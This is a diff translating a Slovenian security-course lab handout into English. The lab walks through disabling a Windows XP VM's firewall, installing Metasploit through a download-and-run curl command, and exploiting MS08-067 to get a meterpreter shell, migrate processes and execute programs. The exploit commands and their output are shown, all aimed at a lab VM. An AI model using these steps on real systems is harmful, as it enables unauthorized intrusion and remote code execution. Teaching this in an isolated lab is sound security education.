@@ -1,65 +1,65 @@
-# 11. Vaja: Izvajanje v naprej pripravljenih napadov
+# 11. Lab: Carrying out pre-prepared attacks
 
-## Navodila
+## Instructions
 
-1. Izvedite napad na navidezni računalnik z operacijskim sistemom Windows XP.
+1. Perform an attack on a Windows XP virtual machine.
 
-## Dodatne informacije
+## More information
 
-## Podrobna navodila
+## Detailed instructions
 
-### 1. Uporaba Metasploit
+### 1. Using Metasploit
 
-Na prejšnjih vajah smo sami napisali program, ki povozi sklad drugemu programu oz. vrnitveni naslov funkcije in požene `Python` ukazno vrstico. Vidimo, da sta program, ki izkorišča ranljivost in program, ki se požene, med seboj neodvisna. Zato lahko uporabimo program, ki že zna izkoristiti to ranljivost in mu mi podamo samo program, ki ga želimo pognati. Prav tako, lahko zna tak program sam poiskati in izkoristiti znane ranljivosti. Eden izmed takih program je [Metasploit](https://en.wikipedia.org/wiki/Metasploit), ki ga lahko dobimo [tukaj](https://github.com/rapid7/metasploit-framework).
+In the previous exercises, we wrote a program that overruns the stack of another program or the return address of the function and runs the `Python` command line. We can see that the program that exploits the vulnerability and the program that runs are independent of each other. Therefore, we can use a program that already knows how to exploit this vulnerability and we only give it the program we want to run. Also, such a program itself can search for and exploit known vulnerabilities. One such program is [Metasploit](https://en.wikipedia.org/wiki/Metasploit), which can be obtained [here](https://github.com/rapid7/metasploit-framework).
 
-Naš cilj bo vdreti v navidezni računalnik z operacijskim sistemom Windows XP, ki se nahaja na navideznem disk `muha.vmdk`, ki ga dobite [tukaj](https://polz.si/dsrf/muha.vmdk).
+Our goal will be to break into a virtual computer with the Windows XP operating system located on the `muha.vmdk` virtual disk that you get [here](https://polz.si/dsrf/muha.vmdk).
 
-Z `VrtualBox` ustvarimo nov navidezni računalnik z navideznim diskom `muha.vmdk`, tako da pritisnemo na gumb `New`. V zavihku `Name and Operating System` vpišemo poljubno ime navideznega računalnika v polje `Name:`, na primer `WindowsXP`.
+With `VirtualBox` we create a new virtual computer with the virtual disk `muha.vmdk` by pressing the `New` button. In the `Name and Operating System` tab, enter any name of the virtual computer in the `Name:` field, for example `WindowsXP`.
 
-![Zavihek Name and Operating System](slike/vaja11-vbox1.png)
+![Name and Operating System Tab](images/lab11-vbox1.png)
 
-V zavihku `Hardware` spremenimo število procesorjev pod `Processors` na 2.
+In the `Hardware` tab, change the number of processors under `Processors` to 2.
 
-![Zavihek Hardware](slike/vaja11-vbox2.png)
+![Hardware tab](images/lab11-vbox2.png)
 
-V zavihku `Hard Disk` izberemo možnost `Use an Existing Virtual Hard Disk File`, ki ga izberemo s klikom na gumb z rumeno mapo in zeleno puščico, kjer dodamo navidezni disk `muha.vmdk` s pritiskom na gumb `Add` in ga nato izberemo s pritiskom na gumb `Choose`.
+In the `Hard Disk` tab, select the `Use an Existing Virtual Hard Disk File` option, which is selected by clicking on the button with the yellow folder and green arrow, where we add the virtual disk `muha.vmdk` by pressing the `Add` button and then selecting it by pressing the `Choose` button.
 
-![Zavihek Hard Disk](slike/vaja11-vbox3.png)
+![Hard Disk tab](images/lab11-vbox3.png)
 
-![Čarovnik za izbiro navideznega diska.](slike/vaja11-vbox4.png)
+![Virtual Disk Selection Wizard.](images/lab11-vbox4.png)
 
-Potrdimo izbrane nastavitve s pritiskom na gumb `Finish` in tako ustvarimo navidezni računalnik. Za uspešni zagon Windows XP operacijskega sistema moramo spremeniti nastavitve s klikom na gumb `Settings` v podrobnostih navideznega računalnika. V zavihku `System` nastavimo nastavitev `Chipset:` na vrednost `PXII3` in nastavitev `Extended Features:` na vrednost `Enable I/O APIC`.
+Confirm the selected settings by pressing the `Finish` button and thus create a virtual computer. To successfully run the Windows XP operating system, we need to change the settings by clicking the `Settings` button in the details of the virtual machine. In the `System` tab, set the `Chipset:` setting to `PXII3` and the `Extended Features:` setting to `Enable I/O APIC`.
 
-![Zavihek System navideznega računalnika.](slike/vaja11-vbox5.png)
+![System tab of the virtual machine.](images/lab11-vbox5.png)
 
-V zavihku `Storage`, kliknemo na `IDE` krmilnik diska `muha.vmdk` in nastavimo `Type:` na `PXII3`.
+In the `Storage` tab, click on the `IDE` disk controller `muha.vmdk` and set `Type:` to `PXII3`.
 
-![Zavihek Storage navideznega računalnika.](slike/vaja11-vbox6.png)
+![Storage tab of the virtual machine.](images/lab11-vbox6.png)
 
-V zavihku `Network` za nastavitev `Attached to:` izberemo možnost `NAT Network`. Če `NAT Network` še nismo ustvarili, kliknemo na ikono `Tools` nad navideznimi računalniki ter nato na ikono s tremi vrsticami, kjer izberemo meni `Network`. Tukaj sedaj izberemo zavihek `NAT Networks` in pritisnemo na gumb `Create` zgoraj.
+In the `Network` tab, select the `NAT Network` option for the `Attached to:` setting. If we haven't created a `NAT Network` yet, click on the `Tools` icon above the virtual computers and then on the icon with three lines, where we select the `Network` menu. Here we now select the `NAT Networks` tab and press the `Create` button above.
 
-![Meni Tools s podmenijem Network.](slike/vaja11-vbox7.png)
+![Tools menu with Network submenu.](images/lab11-vbox7.png)
 
-V zavihki `Network` kliknemo na gumb `Advanced`, da se nam odprejo dodatne nastavitve, kjer pod `Adapter Type` izberemo vrednost `PCnet-FAST III (Am79c973)`, ki predstavlja omrežno kartico, ki jo Windows XP privzeto podpira.
+In the `Network` tab, click on the `Advanced` button to open additional settings, where under `Adapter Type` we select the `PCnet-FAST III (Am79c973)` value, which represents the network card that Windows XP supports by default.
 
-![Zavihek Network navideznega računalnika.](slike/vaja11-vbox8.png)
+![Network tab of the virtual machine.](images/lab11-vbox8.png)
 
-Prepričamo se ali je naš `Debian` navidezni računalnik prav tako v enakem omrežju `NAT Network`. Poženemo oba navidezna računalnika, tako `Windows XP` in `Debian` hkrati, ter preverimo njuna IP naslova. Na `Debian`-u to lahko storimo z ukazom `ip a`, na `Windows XP` pa z `ipconfig`. Sedaj še preverimo povezljivost med njima z ukazom `ping`. Iz `Windows XP` lahko vidimo `Debian` preko mreže, obratno pa ne drži. Zato na `Windows XP` izklopimo požarni zid, tako da kliknemo na meni `Start`, nato `Control Panel` in `Security Center` ter spodaj na `Windows Firewall`. V pojavnem oknu sedaj izberemo možnost `Off` in pritisnemo na gumb `OK`. Sedaj lahko `Debian` vidi `Windows XP` preko omrežja.
+Let's make sure that our `Debian` virtual machine is also in the same `NAT Network`. We run both virtual machines, `Windows XP` and `Debian` at the same time, and check their IP addresses. On `Debian` this can be done with the `ip a` command, and on `Windows XP` with `ipconfig`. Now let's check the connectivity between them with the `ping` command. From `Windows XP` we can see `Debian` over the network, but the reverse is not true. Therefore, on `Windows XP`, we turn off the firewall by clicking on the `Start` menu, then `Control Panel` and `Security Center` and below on `Windows Firewall`. In the pop-up window, select the `Off` option and press the `OK` button. Now `Debian` can see `Windows XP` over the network.
 
-Sedaj namestimo Metasploit po priporočenem postopku z uporaba ukaza [`curl`](https://www.man7.org/linux/man-pages/man1/curl.1.html).
+Now let's install Metasploit according to the recommended procedure using the command [`curl`](https://www.man7.org/linux/man-pages/man1/curl.1.html).
 
     apt update
     apt install curl
 
     curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 
-Poženemo Metasploit z ukazom `msfconsole` ter počakamo, da se zažene. Ukaz `help` nam prikaže načine uporabe Metasploit. Z ukazom `set RHOSTS` nastavimo IP naslov računalnika, ki ga želimo napasti
+Start Metasploit with `msfconsole` command and wait for it to start. The `help` command shows us how to use Metasploit. With the `set RHOSTS` command, we set the IP address of the computer we want to attack.
 
     msfconsole
 
     set RHOSTS 10.0.2.4
 
-Izkoristili bomo ranljivost [CVE-2008-4250](https://www.cvedetails.com/cve/CVE-2008-4250/), tako da poiščemo primerni napad z ukazom `search`, preverimo ali je računalnik ranljiv z ukazom `rcheck` in nato izvedemo napad z ukazom `exploit`.
+We will exploit the vulnerability [CVE-2008-4250](https://www.cvedetails.com/cve/CVE-2008-4250/) by searching for a suitable attack using the `search` command, checking if the computer is vulnerable using the command `rcheck` and then we execute the attack with the command `exploit`.
 
     msf6 > search ms08-067
 
@@ -90,7 +90,7 @@ Izkoristili bomo ranljivost [CVE-2008-4250](https://www.cvedetails.com/cve/CVE-2
 
     meterpreter > 
 
-Sedaj smo z ukazno vrstico povezani v navidezni računalnik `WindowsXP`. Z ukazom `ps` lahko izpišemo vse procese, ki trenutno tečejo na sistemu.
+We are now connected to the `WindowsXP` virtual computer using the command line. The `ps` command can be used to list all processes currently running on the system.
 
     meterpreter > ps
 
@@ -131,7 +131,7 @@ Sedaj smo z ukazno vrstico povezani v navidezni računalnik `WindowsXP`. Z ukazo
                                                                             exe
     1604  1528  explorer.exe      x86   0        WORKGROU-8E8989\user         C:\WINDOWS\Explorer.EXE
 
-Sedaj lahko poženemo poljubni program z ukazom `execute` in ga ustavimo z ukazom `kill`. Naš program se ne zažene na zaslonu vendar v ozadju, saj ga ne zaganjamo kot trenutni uporabnik. Zato se moramo prestaviti v program, ki že teče, katerega lastnik je trenutni uporabnik z ukazom `migrate` in nato z ukazom `execute` lahko poženemo program na zaslonu.
+Now we can run any program with the `execute` command and stop it with the `kill` command. Our program does not run on the screen but in the background, since we do not run it as the current user. Therefore, we need to move to a program that is already running, owned by the current user with the command `migrate` and then with the command `execute` we can run the program on the screen.
 
     meterpreter > execute -f mspaint.exe
     Process 1456 created.
@@ -226,4 +226,3 @@ Sedaj lahko poženemo poljubni program z ukazom `execute` in ga ustavimo z ukazo
     [*] Migration completed successfully.
     meterpreter > execute -f mspaint.exe
     Process 1752 created.
-
